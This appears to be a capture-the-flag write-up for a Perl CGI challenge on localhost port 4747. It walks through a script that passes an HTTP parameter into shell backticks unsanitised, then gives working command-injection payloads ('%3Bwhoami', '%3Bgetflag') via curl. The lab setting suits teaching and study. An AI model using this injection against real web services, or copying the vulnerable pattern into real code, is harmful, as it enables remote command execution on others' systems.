## Phase 1: Reconnaissance

As with previous levels, the first step was to inspect the current directory

- `ls` reveals a Perl script named `level04.pl`




We inspect the file and notice:
- It is written in **Perl**
- It uses **CGI**
- A comment mentions `localhost:4747`

- This suggests that the script is executed by an **HTTP server** and this file is a hint for something

To confirm this, we list listening network ports:
```bash
netstat -lntu
```

- This shows several open ports, including **4747**, which matches the comment found in the script

- To verify that the service is active, we try connecting to it using `curl`:

```bash
curl http://127.0.0.1:4747
```
The request succeeds, confirming that an HTTP server is currently running on port **4747**

---

## Phase 2: Script Analysis

We re-read the Perl script to understand what is this:

```perl
use CGI qw{param}; 
# this lets the script read parameters from an HTTP request (like ?x=hello)

print "Content-type: text/html\n\n";

sub x {   
  # this defines a function named x in perl

  $y = $_[0]; 
  # $_[0] is the first argument passed to the function
  # we store it in $y

  print `echo $y 2>&1`; 
  # in Perl, backticks ` ` means to run this as a shell command
  # the shell runs: echo <user input>
}

x(param("x")); 
# reads the HTTP parameter named "x"
# passes it to function x
# this triggers the shell command execution
```

From this code, we can observe:
- The script reads the HTTP parameter `x`
- The value of `x` is passed directly into a shell command
- No filtering or sanitization is performed

---

## Phase 3: Exploitation

Since the input is not sanitized, we attempt to escape the `echo` command

To do this, we inject a shell command separator (`;`)  
Because `;` has a special meaning in URLs, it must be URL-encoded

- `;` becomes `%3B`

We test this behavior with:

```bash
curl -v "http://127.0.0.1:4747/?x=%3Bwhoami"
```

When decoded by the server, this results in the following command:

```sh
echo hi; whoami
```

The response confirms that the injected command is executed with elevated privileges.
```console
...
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 8
< Content-Type: text/html
< 

flag04
* Connection #0 to host 127.0.0.1 left intact
* Closing connection #0
...
```
---

## Phase 4: Getting the Flag

Since arbitrary command execution is possible, we repeat the same process using `getflag`:

```bash
curl -v "http://127.0.0.1:4747/?x=%3Bgetflag"
```

This returns the token for **flag04**, allowing us to proceed to the next level

We escaped the `echo` command and executed an arbitrary shell command, successfully calling `getflag` to retrieve the token
